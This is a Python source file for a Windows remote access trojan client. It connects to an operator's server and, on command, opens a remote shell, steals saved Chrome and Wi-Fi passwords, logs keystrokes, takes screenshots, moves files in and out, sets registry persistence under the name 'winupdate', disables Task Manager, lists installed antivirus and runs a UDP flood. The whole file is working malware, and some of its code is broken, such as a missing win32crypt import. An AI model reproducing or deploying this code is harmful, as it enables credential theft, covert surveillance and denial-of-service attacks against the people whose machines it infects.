from __future__ import absolute_import
import netifaces
import os, socket, platform , json, getpass, psutil, subprocess, threading, signal, requests, random, struct, sys, sqlite3, base64, pynput.keyboard 
from shutil import copyfile
from winreg import *
import pyscreeze, ctypes, time, win32com.client 

from Crypto.Cipher import AES

global counter
global key

counter = "H"*16 
key1 = "H"*32
def encrypt( message):

    encrypto = AES.new(key1, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)


def decrypt( message):

    decrypto = AES.new(key1, AES.MODE_CTR, counter=lambda:counter)
    return  decrypto.decrypt(message) 


class Client(object):

    global key_listener
    global key
    global objWMIService
    global objSWbemServices
    global strComputer
    global colItems
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator") 
    objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
    colItems = objSWbemServices.ExecQuery("Select * from Win32_Product")
	

    def OnKeyboardEvent(event):
        global logs 
        try:
	        logs
        except NameError:
            logs = ""
        try:
            logs = logs + str(event.char)
        except AttributeError:
            if event == key.space:
                logs = logs + " "
            elif event == key.enter:
                logs = logs + " \n "
            elif event == key.backspace:
                logs = logs[:-1]
            elif event == key.shift:
                logs = logs
            else:
                logs = logs + " " + str(event) + " "

    key_listener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
    key = pynput.keyboard.Key

    def __init__(self):
        self.serverHost = '127.0.0.1'
        #self.serverHost = 'localhost'
        self.serverPort = 8000
        self.socket = None
		
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print( u'\n[++] Quitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print (u'Could not close connection %s' +  str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        u""" Create a socket """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as e:
            print(u"Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        u""" Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print( u"Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(socket.gethostname().encode())
            #self.run_at_startup()
        except socket.error as e:
            print( u"Cannot send hostname to server: " + str(e))
            raise
        
        return

    def print_output(self, output_str):
        u""" Prints command output """
        sent_message = output_str + str(os.getcwdu()) + str('> ')
        self.socket.send(struct.pack(u'>I', len(sent_message)) + str(sent_message))
        print (output_str)
        return

    def get_jnfo(self):
        hostname = socket.gethostname()
        system = platform.system()
        release = platform.release()
        loggedUser= getpass.getuser()
        info = "\n Hostname : " + hostname + " \n Logged User: " + loggedUser + " \n Operating System : " + system + " , " + release + " \n "
        info_arr = []
        info_arr.append(info)
        info1 = json.dumps(info_arr)
        self.socket.send(encrypt(info1))
    def network_info(self):
        ifaces = netifaces.interfaces()
        arr = []
        for i in ifaces:
            interface = " \n Interface : " + str(i)
            TheIPaddressOFinterface = netifaces.ifaddresses(i)
            if netifaces.AF_INET in TheIPaddressOFinterface:
                theIP_detail = 	TheIPaddressOFinterface[netifaces.AF_INET]
                theIP_detail_ex = theIP_detail[0]
                g_mac = netifaces.ifaddresses(i)[netifaces.AF_LINK]
                mac = g_mac[0]['addr']
                ip = " \n IP : " + str(theIP_detail_ex['addr']) + " \n MAC Address : " +  str(mac)  + " \n Netmask : " + str(theIP_detail_ex['netmask']) + " \n "
                network = interface + ip  
                arr.append(str(network))
        arr1 = json.dumps(arr)
        arr2 = encrypt(arr1)
        self.socket.send(arr2)

    def ps_list(self):
        arr = []
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid','name', 'username'])
                arr.append(pinfo)
            except psutil.NoSuchProcess:
                pass
        info1 = json.dumps(arr)
        self.socket.send(encrypt(info1))

    def kill_proc(self, proc):
        psid = int(proc.split(" ")[-1])
        kill_arr = []		
        try:
           p = psutil.Process(psid)
           p.kill()
           
           kill_arr.append(" [++] We killed the process successfully " + str(p))
           kill_info = json.dumps(kill_arr)
           self.socket.send(encrypt(kill_info))
        except psutil.NoSuchProcess:
           error_msg = " [++] No such Process! "
           kill_arr.append(error_msg)
           kill_info = json.dumps(kill_arr)
           self.socket.send(encrypt(kill_info))
        except psutil.AccessDenied:
           error_msg = " [++] You do not have the permission to access the process ... "
           kill_arr.append(error_msg)
           kill_info = json.dumps(kill_arr)
		   
           self.socket.send(encrypt(kill_info))

    def get_sysinfo(self):
	
        sysinfo_arr = []
        cpu = " \n [++] CPU Percentage :" + str(psutil.cpu_percent(interval=1)) + " %"
        cpu_count = " \n [++] CPU Count :" + str(psutil.cpu_count())
        total_mem = " \n [++] Total  Memory : " +  str(si_format(psutil.virtual_memory()[0]))
        total_mem_available =  " \n [++] Total Availabe Memory : " + str(si_format(psutil.virtual_memory()[1]))
        total_mem_used_percent = " \n [++] Total Used Memory Percentage : " + str(psutil.virtual_memory()[2]) + " %"
        total_mem_used = " \n [++] Total Used Memory : " + str(si_format(psutil.virtual_memory()[3])) 
        total_mem_free = " \n [++] Total Free Memory : " + str(si_format(psutil.virtual_memory()[4]))
        disk = psutil.disk_usage('/')
        disk_total = " \n [++] Disk Size  : " + str(si_format(disk.total / (1024.0 ** 3)))
        disk_used = " \n [++] Used Space  : " +  str(si_format(disk.used / (1024.0 ** 3)))
        disk_free = " \n [++] Free Space  : " +  str(si_format(disk.free / (1024.0 ** 3)))
        disk_percent = " \n [++] Total Used Disk Percentage : " + str(disk.percent) + " %"

        info = cpu + cpu_count + total_mem + total_mem_available + total_mem_used_percent + total_mem_used + total_mem_free  + disk_total + disk_used + disk_free + disk_percent
        sysinfo_arr.append(info)
        sysinfo_info1 = json.dumps(sysinfo_arr)
        self.socket.send(encrypt(sysinfo_info1))

    def chrome_passwords(self):
        APPDATA = os.environ["APPDATA"]
        strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"		
        
        if not os.path.isfile(strPath):
            print( " [--] The file is not exists ")
        try:
            conn_sql = sqlite3.connect(strPath)
            objCursor = conn_sql.cursor()
        except Exception as e:
            print (e)
        try:
            objCursor.execute("Select action_url, username_value, password_value FROM logins")
        except:
            subprocess.Popen(["taskkill", "/f", "/im", "chrome.exe"], shell=False)
            objCursor.execute("Select action_url, username_value, password_value FROM logins")
            pass
			
        dump_arr = []
        for result in objCursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                row = "Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: "  + str(password)
                dump_arr.append(row)
				
        if len(dump_arr) > 0:
            dump_info = json.dumps(dump_arr)
            self.socket.send(encrypt(dump_info))
        else:
            msg = "[--] There were no saved passwords ... "
            dump_arr.append(msg)
            dump_info = json.dumps(dump_arr)
            self.socket.send(encrypt(dump_info))		
    def run_at_startup(self):
        msg_arr = []
        try:
            strPath = os.path.realpath(sys.argv[0])
            APPDATA = os.environ["APPDATA"]
            strAppPath = APPDATA + "\\" + os.path.basename(strPath)
            if not os.path.exists(strAppPath):
                copyfile(strPath, strAppPath)
                objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
                SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
                msg = " [++] We have enabled successfully the persistence mode "
                msg_arr.append(msg)
                startup_info = json.dumps(msg_arr)
                self.socket.send(encrypt(startup_info))
            else:
                msg = " [++] Persistence mode is previously enabled "
                msg_arr.append(msg)
                startup_info = json.dumps(msg_arr)
                self.socket.send(encrypt(startup_info))
				
        except Exception as e:
            msg = " [++] We were able to enable the persistence mode  due to " + str(e)
            msg_arr.append(msg)
            startup_info = json.dumps(msg_arr)
            self.socket.send(encrypt(startup_info))			
            		
    def get_wifi_passwords(self):
        alist = []

        #try:
        try:
            gather_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles' ]).split("\n")
            profiles = [i.split(":")[1][1:-1] for i in gather_profiles if "All User Profile" in i] 
        except subprocess.CalledProcessError:
            profiles = 0
        except Exception as e:
            profiles = 0
        if profiles != 0:
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    name_password = " [++] We found " + str(i) + ":" + str(results[0]) 
                    alist.append(str(name_password))
                except IndexError as e:
                    pass
            alist_info = json.dumps(alist)
            self.socket.send(encrypt(alist_info))
        else:
            msg = "[--] There were no saved wifi passwords ... "
            alist.append(msg)
            alist_info = json.dumps(alist)
            self.socket.send(encrypt(alist_info))  
  		
			
    def get_screenshot(self):
        tmp_dir = os.environ["TEMP"]
        screenshot_path = str(tmp_dir) + "image.png"
        try:
            screenshot = pyscreeze.screenshot(screenshot_path)
            screenshot_info = os.path.getsize(screenshot_path)
            self.socket.send(encrypt(" \n [++] Receiving a screenshot ... \n" + " [++] File size : " + str(screenshot_info) + " Bytes"))
		
            if screenshot_info > 0:   
                sh = open(screenshot_path, "rb")
                time.sleep(1)
                self.socket.send(encrypt(sh.read()))
        except:
            self.socket.send(encrypt("[--] Error"))
    def lock_pc(self):
        try: 
            ctypes.windll.user32.LockWorkStation()
            self.socket.send(encrypt("\n [++] We locked the device successfully. "))
        except:
            self.socket.send(encrypt(" \n [--] We could not lock the device ... "))

    def upload_file(self, command):
        
        try:
            get_url = command.split(" ")
            get_response = requests.get(get_url[1])
            file_name = get_url[1].split("/")[-1]
            hash = random.getrandbits(10)
            file_name_split = file_name.split(".")
            with open(str(file_name_split[0])+"_"+str(hash)+"."+str(file_name_split[1]), "wb") as fileObj:
                fileObj.write(get_response.content)
            self.socket.send(encrypt(" \n [--] We have uploaded the file successfully  and it saved under directory " + str(os.getcwd()) + " ... \n" + str(os.getcwd()) + "> "))
        except Exception as e:
            self.socket.send(encrypt(" \n [--] We could not upload the requested URL due to : " +  str(e) +"... \n " + str(os.getcwd()) + "> "))
    def download_file(self, command):
        split = command.split(" ")
         
        file_dir = split[1]
        print (file_dir)
        try:
            file_dir_size = os.path.getsize(file_dir)
            self.socket.send(encrypt(" \n [++] Receiving the requested ... \n" + " [++] Totla size : " + str(file_dir_size) + " Bytes"))
        except:
            self.socket.send(encrypt("\n [--] No such file ... "))
            self.mantain_cmd()
        try:
            sh = open(file_dir, "rb")
            time.sleep(1)
            self.socket.send(encrypt(sh.read()))
        except:
            self.socket.send(encrypt(" \n [--] We could not send directory ... "))

    def mantain_cmd(self):
        while True:
            command = decrypt(self.socket.recv(20480))
            if command[:2] == "cd":
                dir = command[3:]
                try:
                    os.chdir(dir.strip())
                    self.socket.send(encrypt(str(str(os.getcwd()) + '> ')))
                    continue
                except Exception as e:
                    error_msg =  " [--] Could not change directory : %s\n" %str(e)
                    self.socket.send(encrypt(str(error_msg)))
                    continue
            elif command == "quit":
                self.socket.send(encrypt("quit"))
                break
            elif command[:6] == "upload":
                    self.upload_file(command)
            elif command[:8] == "download":
                    self.download_file(command)
            #elif command == " ":
                #self.socket.send(" \n [--] You have to type known commands \n")
                #continue
            #elif command == "":
				#break
            elif len(command) > 0:								
                md = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = md.stdout.read() + md.stderr.read()
                cwd = str(str(os.getcwd()) + '> ')
                info = str(output_bytes) + str(cwd)
                self.socket.send(encrypt(info))
                continue
                    #self.socket.close()   
        self.receive_commands()
    def key_logger(self, action):
        global logs 
        if action == "keystart":
            if not key_listener.running:
                try:
                    key_listener.start()
                    self.socket.send(encrypt(" \n [++] We have started logging "))
                except Exception as e:
                    self.socket.send(encrypt(" \n [++] We could not start the key logger due to : " + str(e)))				
            else:
                self.socket.send(encrypt(" \n [--] There was an error starting logging .. "))
        elif action == "keystop":
            if key_listener.running:
                try:
                    key_listener.stop()
                    threading.Thread.__init__(key_listener)
                    logs = ""
                    self.socket.send(encrypt(" \n [++] We have stopped logging "))
                except Exception as e:
                    print (str(e))
            else:
                self.socket.send(encrypt(" \n [--] There was an error stopping logging .. "))
        elif action == "keydump":
            if not key_listener.running:
                self.socket.send(encrypt(" \n [--] There is an error dumpping .."))
            else:
                try:
                    if logs == "":
                        self.socket.send(encrypt(" \n [--] it is empty .."))
                    else:
                        time.sleep(0.2)
                        self.socket.send(encrypt(str(len(logs))))
                        time.sleep(0.2)
                        self.socket.send(encrypt(str(logs)))
                        logs == ""
                except:
                    logs = ""
                    self.socket.send(encrypt(" \n [--] it is empty ..")) 
    def installed_programs(self):
        pro_list = []
        self.socket.send(encrypt(" [++] We have started gathering the installed applications ... "))
        for objItem in colItems:
            if str(objItem.InstallLocation) != "None":
                try:	
                    pro =  " [++] Name: ", str(objItem.Name) + " \n Install Location: " + str(objItem.InstallLocation) + "\n Install Date: " +  str(objItem.InstallDate) 
                    pro_list.append(pro)
                except UnicodeEncodeError:
                    pro = " [++] Name: ", objItem.Name.encode("utf-8") + "\n Install Location: " + str(objItem.InstallLocation) +  "\n Install Date: " + str(objItem.InstallDate)
                    pro_list.append(pro)
        pro_send = json.dumps(pro_list)
        self.socket.send(encrypt(pro_send))	
    def taskman(self,data):
        msg_arr = []
        status = data.split("taskman ")[1]
        if status == "disable":
            try:
                cmd = r"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f"
                proc = subprocess.Popen(cmd, shell=True)
                proc.terminate()
                msg = "[++] Successfully disabled"
            except:
                msg = "\n[--] Failed to "+ status +" the Task Manager: "
                
        elif status == "enable":
            try:
                cmd = r"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 0 /f"
                proc = subprocess.Popen(cmd, shell=True)
                proc.terminate()
                msg = "[++] Successfully enabled" 
            except:
                msg = "\n[--] Failed to "+ status +" the Task Manager: " 

        msg_arr.append(msg)
        taskmsg = json.dumps(msg_arr)
        self.socket.send(encrypt(taskmsg))

    def av_list(self):
        av = [["symantec antivirus","Symantec Endpoint Protection"],["mcshield","McAfee Security"],["windefend","Windows Defender"],["msmpsvc","Microsoft Security Essentials"],["msmpeng","Microsoft Security Essentials"],["savservice","Sophos Antivirus"],["aveservice","Avast!"],["avast! antivirus","Avast!"],["immunetprotect","Immunet Protect"],["fsma","F-Secure"],["antivirservice","AntiVir"],["avguard","Avira"],["fpavserver","F-Protect"],["pshost","Panda Security"],["pavsrv","Panda AntiVir"],["bdss","BitDefender"],["abmainsv","ArcaBit/ArcaVir"],["ikarus-guardx","IKARUS"],["ekrn","ESET Smart Security"],["avkproxy","G Data Antivirus"],["klblmain","Kaspersky Lab Antivirus"],["vbservprof","Symantec VirusBlast"],["clamav","ClamAV"],["bdwxtag","bit defender"],["bdagent","bit defender"],["SBAMSvc","Vipre / GFI managed AV"],["navapsvc","Norton"],["ekrn","ESET"],["AVP","Kaspersky"],["ByteFence","ByteFence Anti-Malware"]]
        avfound = []
        countav = 0
        try:
            activeservices = subprocess.Popen('sc query | find /I "DISPLAY_NAME"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = activeservices.stdout.read() + activeservices.stderr.read()
            info = str(output_bytes)
            services = info.split("\n") 
            for service in services:
                for item in av:
                    if (item[0] in service) or (item[1] in service):
                        avfound.append("[++] Detected anti-malware: " + item[1])
                    
        except psutil.NoSuchProcess:
            pass
        if len(avfound)<0:
            avfound.append("[++] No antimalware detected.")
            
        info1 = json.dumps(avfound)
        self.socket.send(encrypt(info1)) 
    def services_list(self):
        arr = []
        for s in list(psutil.win_service_iter()):
            name =  s.name()
            service = psutil.win_service_get(name)
            running = service.status()
            if running == "running":
                try:
                    info = " Service Name : " + str(service.name()) + " , " + " Start Type : " + str(service.start_type()) + " , " +   " Status : " + str(service.status())  +   " , PID : " + str(service.pid()) + " \n ----------------------------------------------------- "
                    arr.append(info)
                except Exception as e:
                    print (e)
        arr_dumps = json.dumps(arr)
        self.socket.send(encrypt(arr_dumps))
###----Fire. (UDP flood)
    def dos_run(self, cmd):
        msg = ""
        msg_arr = []
        def dos(target,port,timeout):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            randpackets = random._urandom(40800)
            sent = 0
            starttime = time.time()
            result = ""
            while True:
                try:
                    if time.time() > starttime + float(timeout):
                        break
                    else:
                        pass
                    sock.sendto(randpackets,(target,int(port)))
                    sent+=1
                    print(time.time()) 
                    print(result)
                except Exception as e:
                    result = "\n[--] Could not send packets to the target : " + str(e)
                    break
            result = result + "\n[++] Sent " + str(sent) + " packets to " + target + ":" + str(port)
            return result
        
        args = []
        processes = []
        cmd = cmd.split("dos ")[1]
        args = cmd.split(" ")
        if len(args) == 3:
            target = args[0]    
            port = args[1]
            timeout = args[2]
        
            msg = dos(target,port,timeout)
        else:
            msg = "\n[--] Invalid number of arguments"
            
        msg_arr.append(msg)
        dosmsg = json.dumps(msg_arr)
        self.socket.send(encrypt(msg))
###-------- 
		
    def receive_commands(self):
        global enc_message
        global dec_message

        while True:
            output_str = None
            data = decrypt(self.socket.recv(20480))
            if data == '': break
            elif data == 'quit':
                self.socket.close()
                break
            elif len(data) > 0:
	            
                if data == "info":
                    self.get_jnfo()
                elif data == "network":
                    self.network_info()
                elif data == "ps list": 
                    self.ps_list()
                elif data == "sysinfo": 
                    self.get_sysinfo()
                elif data[0:4] == "kill":
                    self.kill_proc(data)
                elif data == "dump chrome passwords":
                    self.chrome_passwords()

                elif data == "cmd":
                    cwd = str(str(os.getcwd()) + '> ')
                    self.socket.send(encrypt(str(cwd)))
                    self.mantain_cmd()
                elif data == "persistence":
                    self.run_at_startup()
                elif data == "get wifi passwords":
                    self.get_wifi_passwords()
                elif data == "screenshot":
                    self.get_screenshot()
                elif data == "lock":
                    self.lock_pc()
                elif data[:8] == "download":
                    self.download_file(data)
                elif data == "keystart":
                    self.key_logger(data)
                elif data == "keydump":
                    self.key_logger(data)
                elif data == "keystop":
                    self.key_logger(data)					
                elif data == "programs list":
                    self.installed_programs()
                elif data == "taskman enable" or data == "taskman disable":
                    self.taskman(data)
                elif data == "find av":
                    self.av_list()	
                elif data == "services list":
                    self.services_list()
                elif "dos" in data:
                    self.dos_run(data)					

                elif data == " ":
                    self.socket.send(encrypt(" "))

        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            #print u"Error on socket connections: %s" + str(e)
            print('Error on socket connections: ', e)
            time.sleep(5)     
        else:
            print('connection established successfully')
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print( u'Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == u'__main__':
    #file_name = sys._MEIPASS + "\sample.pdf"
    #subprocess.Popen(file_name, shell=True)
    while True:
        main()
